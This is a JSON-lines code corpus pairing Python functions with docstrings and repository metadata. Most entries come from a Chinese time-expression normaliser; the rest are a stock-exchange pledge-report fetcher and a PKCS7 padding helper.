{"docstring": "\"\"\"\n\u65b9\u6cd5numberTranslator\u7684\u8f85\u52a9\u65b9\u6cd5\uff0c\u53ef\u5c06[\u96f6-\u4e5d]\u6b63\u786e\u7ffb\u8bd1\u4e3a[0-9]\n:param s: \u5927\u5199\u6570\u5b57\n:return: \u5bf9\u5e94\u7684\u6574\u5f62\u6570\uff0c\u5982\u679c\u4e0d\u662f\u6570\u5b57\u8fd4\u56de-1\n\"\"\"\n", "func_signal": "def wordToNumber(cls, s):\n", "code": "if (s == u'\u96f6') or (s == '0'):\n    return 0\nelif (s == u'\u4e00') or (s == '1'):\n    return 1\nelif (s == u'\u4e8c') or (s == u'\u4e24') or (s == '2'):\n    return 2\nelif (s == u'\u4e09') or (s == '3'):\n    return 3\nelif (s == u'\u56db') or (s == '4'):\n    return 4\nelif (s == u'\u4e94') or (s == '5'):\n    return 5\nelif (s == u'\u516d') or (s == '6'):\n    return 6\nelif (s == u'\u4e03') or (s == u'\u5929') or (s == u'\u65e5') or (s == u'\u672b') or (s == '7'):\n    return 7\nelif (s == u'\u516b') or (s == '8'):\n    return 8\nelif (s == u'\u4e5d') or (s == '9'):\n    return 9\nelse:\n    return -1", "path": "cocoNLP/cocoNLP/config/basic/time_nlp/StringPreHandler.py", "commit_date": "2018-12-07 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u6dfb\u52a0\u4e86\u7701\u7565\u201c\u79d2\u201d\u8bf4\u6cd5\u7684\u65f6\u95f4\uff1a\u598217\u70b915\u520632\n:return:\n\"\"\"\n", "func_signal": "def norm_setsecond(self):\n", "code": "rule = u\"([0-9]+(?=\u79d2))|((?<=\u5206)[0-5]?[0-9])\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.tp.tunit[5] = int(match.group())\n    self.isAllDayTime = False", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u6708-\u89c4\u8303\u5316\u65b9\u6cd5--\u8be5\u65b9\u6cd5\u8bc6\u522b\u65f6\u95f4\u8868\u8fbe\u5f0f\u5355\u5143\u7684\u6708\u5b57\u6bb5\n:return:\n\"\"\"\n", "func_signal": "def norm_setmonth(self):\n", "code": "rule = u\"((10)|(11)|(12)|([1-9]))(?=\u6708)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.tp.tunit[1] = int(match.group())\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(1)", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u8fc7\u6ee4timeUnit\u4e2d\u65e0\u7528\u7684\u8bc6\u522b\u8bcd\u3002\u65e0\u7528\u8bc6\u522b\u8bcd\u8bc6\u522b\u51fa\u7684\u65f6\u95f4\u662f1970.01.01 00:00:00(fastTime=0)\n:param tu_arr:\n:return:\n\"\"\"\n", "func_signal": "def __filterTimeUnit(self, tu_arr):\n", "code": "if (tu_arr is None) or (len(tu_arr) < 1):\n    return tu_arr\nres = []\nfor tu in tu_arr:\n    if tu.time.timestamp != 0:\n        res.append(tu)\nreturn res", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeNormalizer.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "'''\n\u68c0\u67e5\u672a\u6765\u65f6\u95f4\u70b9\n:param parse: \u89e3\u6790\u51fa\u6765\u7684list\n:return:\n'''\n", "func_signal": "def _check_time(self, parse):\n", "code": "time_arr = self.normalizer.timeBase.split('-')\nif self._noyear:\n    # check the month\n    # print(parse)\n    # print(time_arr)\n    if parse[1] == int(time_arr[1]):\n        if parse[2] > int(time_arr[2]):\n            parse[0] = parse[0] - 1\n    self._noyear = False", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u8be5\u65b9\u6cd5\u5220\u9664\u4e00\u5b57\u7b26\u4e32\u4e2d\u6240\u6709\u5339\u914d\u67d0\u4e00\u89c4\u5219\u5b57\u4e32\n\u53ef\u7528\u4e8e\u6e05\u7406\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u7a7a\u767d\u7b26\u548c\u8bed\u6c14\u52a9\u8bcd\n:param target: \u5f85\u5904\u7406\u5b57\u7b26\u4e32\n:param rules: \u5220\u9664\u89c4\u5219\n:return: \u6e05\u7406\u5de5\u4f5c\u5b8c\u6210\u540e\u7684\u5b57\u7b26\u4e32\n\"\"\"\n", "func_signal": "def delKeyword(cls, target, rules):\n", "code": "pattern = re.compile(rules)\nres = pattern.sub('', target)\n# print res\nreturn res", "path": "cocoNLP/cocoNLP/config/basic/time_nlp/StringPreHandler.py", "commit_date": "2018-12-07 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u5e74-\u89c4\u8303\u5316\u65b9\u6cd5--\u8be5\u65b9\u6cd5\u8bc6\u522b\u65f6\u95f4\u8868\u8fbe\u5f0f\u5355\u5143\u7684\u5e74\u5b57\u6bb5\n:return:\n\"\"\"\n# \u4e00\u4f4d\u6570\u8868\u793a\u7684\u5e74\u4efd\n", "func_signal": "def norm_setyear(self):\n", "code": "rule = u\"(?<![0-9])[0-9]{1}(?=\u5e74)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    year = int(match.group())\n    self.tp.tunit[0] = year\n\n# \u4e24\u4f4d\u6570\u8868\u793a\u7684\u5e74\u4efd\nrule = u\"[0-9]{2}(?=\u5e74)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    year = int(match.group())\n    self.tp.tunit[0] = year\n\n# \u4e09\u4f4d\u6570\u8868\u793a\u7684\u5e74\u4efd\nrule = u\"(?<![0-9])[0-9]{3}(?=\u5e74)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    year = int(match.group())\n    self.tp.tunit[0] = year\n\n# \u56db\u4f4d\u6570\u8868\u793a\u7684\u5e74\u4efd\nrule = u\"[0-9]{4}(?=\u5e74)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    year = int(match.group())\n    self.tp.tunit[0] = year", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u8bbe\u7f6e\u4ee5\u4e0a\u6587\u65f6\u95f4\u4e3a\u57fa\u51c6\u7684\u65f6\u95f4\u504f\u79fb\u8ba1\u7b97\n:return:\n\"\"\"\n# print(self.exp_time)\n", "func_signal": "def norm_setBaseRelated(self):\n", "code": "cur = arrow.get(self.normalizer.timeBase, \"YYYY-M-D-H-m-s\")\nflag = [False, False, False]\n\nrule = u\"\\\\d+(?=\u5929[\u4ee5\u4e4b]?\u524d)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    day = int(match.group())\n    cur = cur.shift(days=-day)\n\nrule = u\"\\\\d+(?=\u5929[\u4ee5\u4e4b]?\u540e)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    day = int(match.group())\n    cur = cur.shift(days=day)\n\nrule = u\"\\\\d+(?=(\u4e2a)?\u6708[\u4ee5\u4e4b]?\u524d)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[1] = True\n    month = int(match.group())\n    cur = cur.shift(months=-month)\n\nrule = u\"\\\\d+(?=(\u4e2a)?\u6708[\u4ee5\u4e4b]?\u540e)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[1] = True\n    month = int(match.group())\n    cur = cur.shift(months=month)\n\nrule = u\"\\\\d+(?=\u5e74[\u4ee5\u4e4b]?\u524d)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[0] = True\n    year = int(match.group())\n    cur = cur.shift(years=-year)\n\nrule = u\"\\\\d+(?=\u5e74[\u4ee5\u4e4b]?\u540e)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[0] = True\n    year = int(match.group())\n    cur = cur.shift(years=year)\n\nif flag[0] or flag[1] or flag[2]:\n    self.tp.tunit[0] = int(cur.year)\nif flag[1] or flag[2]:\n    self.tp.tunit[1] = int(cur.month)\nif flag[2]:\n    self.tp.tunit[2] = int(cur.day)", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\n:param target: \u8f93\u5165\u6587\u672c\u5b57\u7b26\u4e32\n:param timeBase: \u8f93\u5165\u57fa\u51c6\u65f6\u95f4\n:return: TimeUnit[]\u65f6\u95f4\u8868\u8fbe\u5f0f\u7c7b\u578b\u6570\u7ec4\n\"\"\"\n", "func_signal": "def __timeEx(self):\n", "code": "startline = -1\nendline = -1\nrpointer = 0\ntemp = []\n\nmatch = self.pattern.finditer(self.target)\nfor m in match:\n    startline = m.start()\n    if startline == endline:\n        rpointer -= 1\n        temp[rpointer] = temp[rpointer] + m.group()\n    else:\n        temp.append(m.group())\n    endline = m.end()\n    rpointer += 1\nres = []\n# \u65f6\u95f4\u4e0a\u4e0b\u6587\uff1a \u524d\u4e00\u4e2a\u8bc6\u522b\u51fa\u6765\u7684\u65f6\u95f4\u4f1a\u662f\u4e0b\u4e00\u4e2a\u65f6\u95f4\u7684\u4e0a\u4e0b\u6587\uff0c\u7528\u4e8e\u5904\u7406\uff1a\u5468\u516d3\u70b9\u52305\u70b9\u8fd9\u6837\u7684\u591a\u4e2a\u65f6\u95f4\u7684\u8bc6\u522b\uff0c\u7b2c\u4e8c\u4e2a5\u70b9\u5e94\u8bc6\u522b\u5230\u662f\u5468\u516d\u7684\u3002\ncontextTp = TimePoint()\n# print(self.timeBase)\n# print('temp',temp)\nfor i in range(0, rpointer):\n    # \u8fd9\u91cc\u662f\u4e00\u4e2a\u7c7b\u5d4c\u5957\u4e86\u4e00\u4e2a\u7c7b\n    res.append(TimeUnit(temp[i], self, contextTp))\n    # res[i].tp.tunit[3] = -1\n    contextTp = res[i].tp\n    # print(self.nowTime.year)\n    # print(contextTp.tunit)\nres = self.__filterTimeUnit(res)\n\nreturn res", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeNormalizer.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "# 1. \u786e\u8ba4\u7528\u6237\u9009\u9879\n", "func_signal": "def preferFutureWeek(self, weekday, cur):\n", "code": "if not self.normalizer.isPreferFuture:\n    return cur\n# 2. \u68c0\u67e5\u88ab\u68c0\u67e5\u7684\u65f6\u95f4\u7ea7\u522b\u4e4b\u524d\uff0c\u662f\u5426\u6ca1\u6709\u66f4\u9ad8\u7ea7\u7684\u5df2\u7ecf\u786e\u5b9a\u7684\u65f6\u95f4\uff0c\u5982\u679c\u6709\uff0c\u5219\u4e0d\u8fdb\u884c\u5904\u7406.\nfor i in range(0, 2):\n    if self.tp.tunit[i] != -1:\n        return cur\n# \u83b7\u53d6\u5f53\u524d\u662f\u5728\u5468\u51e0\uff0c\u5982\u679c\u8bc6\u522b\u5230\u7684\u65f6\u95f4\u5c0f\u4e8e\u5f53\u524d\u65f6\u95f4\uff0c\u5219\u8bc6\u522b\u65f6\u95f4\u4e3a\u4e0b\u4e00\u5468\ntmp = arrow.get(self.normalizer.timeBase, \"YYYY-M-D-H-m-s\")\ncurWeekday = tmp.weekday()\nif curWeekday > weekday:\n    cur = cur.shift(days=7)\nreturn cur", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u8bbe\u7f6e\u5f53\u524d\u65f6\u95f4\u76f8\u5173\u7684\u65f6\u95f4\u8868\u8fbe\u5f0f\n:return:\n\"\"\"\n# \u8fd9\u4e00\u5757\u8fd8\u662f\u7528\u4e86\u65ad\u8a00\u8868\u8fbe\u5f0f\n", "func_signal": "def norm_setCurRelated(self):\n", "code": "cur = arrow.get(self.normalizer.timeBase, \"YYYY-M-D-H-m-s\")\nflag = [False, False, False]\n\nrule = u\"\u524d\u5e74\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[0] = True\n    cur = cur.shift(years=-2)\n\nrule = u\"\u53bb\u5e74\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[0] = True\n    cur = cur.shift(years=-1)\n\nrule = u\"\u4eca\u5e74\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[0] = True\n    cur = cur.shift(years=0)\n\nrule = u\"\u660e\u5e74\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[0] = True\n    cur = cur.shift(years=1)\n\nrule = u\"\u540e\u5e74\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[0] = True\n    cur = cur.shift(years=2)\n\nrule = u\"\u4e0a*\u4e0a(\u4e2a)?\u6708\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[1] = True\n    rule = u\"\u4e0a\"\n    pattern = re.compile(rule)\n    match = pattern.findall(self.exp_time)\n    cur = cur.shift(months=-len(match))\n\nrule = u\"(\u672c|\u8fd9\u4e2a)\u6708\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[1] = True\n    cur = cur.shift(months=0)\n\nrule = u\"\u4e0b*\u4e0b(\u4e2a)?\u6708\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[1] = True\n    rule = u\"\u4e0b\"\n    pattern = re.compile(rule)\n    match = pattern.findall(self.exp_time)\n    cur = cur.shift(months=len(match))\n\nrule = u\"\u5927*\u5927\u524d\u5929\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    rule = u\"\u5927\"\n    pattern = re.compile(rule)\n    match = pattern.findall(self.exp_time)\n    cur = cur.shift(days=-(2 + len(match)))\n\nrule = u\"(?<!\u5927)\u524d\u5929\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    cur = cur.shift(days=-2)\n\nrule = u\"\u6628\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    cur = cur.shift(days=-1)\n\nrule = u\"\u4eca(?!\u5e74)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    cur = cur.shift(days=0)\n\nrule = u\"\u660e(?!\u5e74)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    cur = cur.shift(days=1)\n\nrule = u\"(?<!\u5927)\u540e\u5929\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    cur = cur.shift(days=2)\n\nrule = u\"\u5927*\u5927\u540e\u5929\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    rule = u\"\u5927\"\n    pattern = re.compile(rule)\n    match = pattern.findall(self.exp_time)\n    flag[2] = True\n\n    cur = cur.shift(days=(2 + len(match)))\n\n# todo \u8865\u5145\u661f\u671f\u76f8\u5173\u7684\u9884\u6d4b done\nrule = u\"(?<=(\u4e0a*\u4e0a\u4e0a(\u5468|\u661f\u671f)))[1-7]?\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    try:\n        week = int(match.group())\n    except:\n        week = 1\n    week -= 1\n    span = week - cur.weekday()\n    rule = u\"\u4e0a\"\n    pattern = re.compile(rule)\n    match = pattern.findall(self.exp_time)\n    cur = cur.replace(weeks=-len(match), days=span)\n\nrule = u\"(?<=((?<!\u4e0a)\u4e0a(\u5468|\u661f\u671f)))[1-7]?\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    try:\n        week = int(match.group())\n    except:\n        week = 1\n    week -= 1\n    span = week - cur.weekday()\n    cur = cur.replace(weeks=-1, days=span)\n\nrule = u\"(?<=((?<!\u4e0b)\u4e0b(\u5468|\u661f\u671f)))[1-7]?\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    try:\n        week = int(match.group())\n    except:\n        week = 1\n    week -= 1\n    span = week - cur.weekday()\n    cur = cur.replace(weeks=1, days=span)\n\n# \u8fd9\u91cc\u5bf9\u4e0b\u4e0b\u4e0b\u5468\u7684\u65f6\u95f4\u8f6c\u6362\u505a\u51fa\u4e86\u6539\u5584\nrule = u\"(?<=(\u4e0b*\u4e0b\u4e0b(\u5468|\u661f\u671f)))[1-7]?\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    try:\n        week = int(match.group())\n    except:\n        week = 1\n    week -= 1\n    span = week - cur.weekday()\n    rule = u\"\u4e0b\"\n    pattern = re.compile(rule)\n    match = pattern.findall(self.exp_time)\n    cur = cur.replace(weeks=len(match), days=span)\n\nrule = u\"(?<=((?<!(\u4e0a|\u4e0b|\u4e2a|[0-9]))(\u5468|\u661f\u671f)))[1-7]\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    flag[2] = True\n    try:\n        week = int(match.group())\n    except:\n        week = 1\n    week -= 1\n    span = week - cur.weekday()\n    cur = cur.replace(days=span)\n    # \u5904\u7406\u672a\u6765\u65f6\u95f4\n    cur = self.preferFutureWeek(week, cur)\n\nif flag[0] or flag[1] or flag[2]:\n    self.tp.tunit[0] = int(cur.year)\nif flag[1] or flag[2]:\n    self.tp.tunit[1] = int(cur.month)\nif flag[2]:\n    self.tp.tunit[2] = int(cur.day)", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u65f6-\u89c4\u8303\u5316\u65b9\u6cd5\uff1a\u8be5\u65b9\u6cd5\u8bc6\u522b\u65f6\u95f4\u8868\u8fbe\u5f0f\u5355\u5143\u7684\u65f6\u5b57\u6bb5\n:return:\n\"\"\"\n", "func_signal": "def norm_sethour(self):\n", "code": "rule = u\"(?<!(\u5468|\u661f\u671f))([0-2]?[0-9])(?=(\u70b9|\u65f6))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.tp.tunit[3] = int(match.group())\n    # print('first', self.tp.tunit[3] )\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(3)\n    self.isAllDayTime = False\n\n# * \u5bf9\u5173\u952e\u5b57\uff1a\u65e9\uff08\u5305\u542b\u65e9\u4e0a/\u65e9\u6668/\u65e9\u95f4\uff09\uff0c\u4e0a\u5348\uff0c\u4e2d\u5348,\u5348\u95f4,\u4e0b\u5348,\u5348\u540e,\u665a\u4e0a,\u508d\u665a,\u665a\u95f4,\u665a,pm,PM\u7684\u6b63\u786e\u65f6\u95f4\u8ba1\u7b97\n# * \u89c4\u7ea6\uff1a\n# * 1.\u4e2d\u5348/\u5348\u95f40-10\u70b9\u89c6\u4e3a12-22\u70b9\n# * 2.\u4e0b\u5348/\u5348\u540e0-11\u70b9\u89c6\u4e3a12-23\u70b9\n# * 3.\u665a\u4e0a/\u508d\u665a/\u665a\u95f4/\u665a1-11\u70b9\u89c6\u4e3a13-23\u70b9\uff0c12\u70b9\u89c6\u4e3a0\u70b9\n# * 4.0-11\u70b9pm/PM\u89c6\u4e3a12-23\u70b9\nrule = u\"\u51cc\u6668\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    if self.tp.tunit[3] == -1:  # \u589e\u52a0\u5bf9\u6ca1\u6709\u660e\u786e\u65f6\u95f4\u70b9\uff0c\u53ea\u5199\u4e86\u201c\u51cc\u6668\u201d\u8fd9\u79cd\u60c5\u51b5\u7684\u5904\u7406\n        self.tp.tunit[3] = RangeTimeEnum.day_break\n    elif 12 <= self.tp.tunit[3] <= 23:\n        self.tp.tunit[3] -= 12\n    elif self.tp.tunit[3] == 0:\n        self.tp.tunit[3] = 12\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(3)\n    self.isAllDayTime = False\n\nrule = u\"\u65e9\u4e0a|\u65e9\u6668|\u65e9\u95f4|\u6668\u95f4|\u4eca\u65e9|\u660e\u65e9|\u65e9|\u6e05\u6668\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    if self.tp.tunit[3] == -1:  # \u589e\u52a0\u5bf9\u6ca1\u6709\u660e\u786e\u65f6\u95f4\u70b9\uff0c\u53ea\u5199\u4e86\u201c\u65e9\u4e0a/\u65e9\u6668/\u65e9\u95f4\u201d\u8fd9\u79cd\u60c5\u51b5\u7684\u5904\u7406\n        self.tp.tunit[3] = RangeTimeEnum.early_morning\n        # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    elif 12 <= self.tp.tunit[3] <= 23:\n        self.tp.tunit[3] -= 12\n    elif self.tp.tunit[3] == 0:\n        self.tp.tunit[3] = 12\n    self.preferFuture(3)\n    self.isAllDayTime = False\n\nrule = u\"\u4e0a\u5348\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    if self.tp.tunit[3] == -1:  # \u589e\u52a0\u5bf9\u6ca1\u6709\u660e\u786e\u65f6\u95f4\u70b9\uff0c\u53ea\u5199\u4e86\u201c\u4e0a\u5348\u201d\u8fd9\u79cd\u60c5\u51b5\u7684\u5904\u7406\n        self.tp.tunit[3] = RangeTimeEnum.morning\n    elif 12 <= self.tp.tunit[3] <= 23:\n        self.tp.tunit[3] -= 12\n    elif self.tp.tunit[3] == 0:\n        self.tp.tunit[3] = 12\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(3)\n    self.isAllDayTime = False\n\nrule = u\"(\u4e2d\u5348)|(\u5348\u95f4)|\u767d\u5929\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    if 0 <= self.tp.tunit[3] <= 10:\n        self.tp.tunit[3] += 12\n    if self.tp.tunit[3] == -1:  # \u589e\u52a0\u5bf9\u6ca1\u6709\u660e\u786e\u65f6\u95f4\u70b9\uff0c\u53ea\u5199\u4e86\u201c\u4e2d\u5348/\u5348\u95f4\u201d\u8fd9\u79cd\u60c5\u51b5\u7684\u5904\u7406\n        self.tp.tunit[3] = RangeTimeEnum.noon\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(3)\n    self.isAllDayTime = False\n\nrule = u\"(\u4e0b\u5348)|(\u5348\u540e)|(pm)|(PM)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    if 0 <= self.tp.tunit[3] <= 11:\n        self.tp.tunit[3] += 12\n    if self.tp.tunit[3] == -1:  # \u589e\u52a0\u5bf9\u6ca1\u6709\u660e\u786e\u65f6\u95f4\u70b9\uff0c\u53ea\u5199\u4e86\u201c\u4e0b\u5348|\u5348\u540e\u201d\u8fd9\u79cd\u60c5\u51b5\u7684\u5904\u7406\n        self.tp.tunit[3] = RangeTimeEnum.afternoon\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(3)\n    self.isAllDayTime = False\n\nrule = u\"\u665a\u4e0a|\u591c\u95f4|\u591c\u91cc|\u4eca\u665a|\u660e\u665a|\u665a|\u591c\u91cc\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    if 0 <= self.tp.tunit[3] <= 11:\n        self.tp.tunit[3] += 12\n    elif self.tp.tunit[3] == 12:\n        self.tp.tunit[3] = 0\n    elif self.tp.tunit[3] == -1:  # \u589e\u52a0\u5bf9\u6ca1\u6709\u660e\u786e\u65f6\u95f4\u70b9\uff0c\u53ea\u5199\u4e86\u201c\u4e0b\u5348|\u5348\u540e\u201d\u8fd9\u79cd\u60c5\u51b5\u7684\u5904\u7406\n        self.tp.tunit[3] = RangeTimeEnum.lateNight\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(3)\n    self.isAllDayTime = False", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u5f85\u5339\u914d\u5b57\u7b26\u4e32\u7684\u6e05\u7406\u7a7a\u767d\u7b26\u548c\u8bed\u6c14\u52a9\u8bcd\u4ee5\u53ca\u5927\u5199\u6570\u5b57\u8f6c\u5316\u7684\u9884\u5904\u7406\n:return:\n\"\"\"\n", "func_signal": "def __preHandling(self):\n", "code": "self.target = StringPreHandler.delKeyword(self.target, u\"\\\\s+\")  # \u6e05\u7406\u7a7a\u767d\u7b26\nself.target = StringPreHandler.delKeyword(self.target, u\"[\u7684]+\")  # \u6e05\u7406\u8bed\u6c14\u52a9\u8bcd\nself.target = StringPreHandler.numberTranslator(self.target)  # \u5927\u5199\u6570\u5b57\u8f6c\u5316", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeNormalizer.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "#url = 'http://www.szse.cn/szseWeb/ShowReport.szse'\n", "func_signal": "def _get_pledge_info_detail(self, date):\n", "code": "url = 'http://www.szse.cn/api/report/ShowReport'\ndata = {\n    'SHOWTYPE': 'xls',\n    'CATALOGID': '1837_gpzyhgxx',\n    'TABKEY': 'tab2',\n    \"txtDate\" : date,\n    'ENCODE'  : 1,\n}\n\n\nresponse = self.do_request(url, data, method='GET', type='binary')\nif response is not None and len(response) > 0:\n    df = pd.read_excel(io.BytesIO(response))\n    return df\nelse:\n    return None", "path": "OpenData/opendatatools/stock/stock_agent.py", "commit_date": "2018-08-24 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\n\u660e\u6587\u4f7f\u7528PKCS7\u586b\u5145\n\u6700\u7ec8\u8c03\u7528AES\u52a0\u5bc6\u65b9\u6cd5\u65f6\uff0c\u4f20\u5165\u7684\u662f\u4e00\u4e2abyte\u6570\u7ec4\uff0c\u8981\u6c42\u662f16\u7684\u6574\u6570\u500d\uff0c\u56e0\u6b64\u9700\u8981\u5bf9\u660e\u6587\u8fdb\u884c\u5904\u7406\n:param text: \u5f85\u52a0\u5bc6\u5185\u5bb9(\u660e\u6587)\n:return:\n\"\"\"\n", "func_signal": "def pkcs7padding(text):\n", "code": "bs = AES.block_size  # 16\nlength = len(text)\nbytes_length = len(bytes(text, encoding='utf-8'))\n# tips\uff1autf-8\u7f16\u7801\u65f6\uff0c\u82f1\u6587\u53601\u4e2abyte\uff0c\u800c\u4e2d\u6587\u53603\u4e2abyte\npadding_size = length if(bytes_length == length) else bytes_length\npadding = bs - padding_size % bs\n# tips\uff1achr(padding)\u770b\u4e0e\u5176\u5b83\u8bed\u8a00\u7684\u7ea6\u5b9a\uff0c\u6709\u7684\u4f1a\u4f7f\u7528'\\0'\npadding_text = chr(padding) * padding\nreturn text + padding_text", "path": "OpenData/opendatatools/aqi2/util.py", "commit_date": "2019-07-22 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
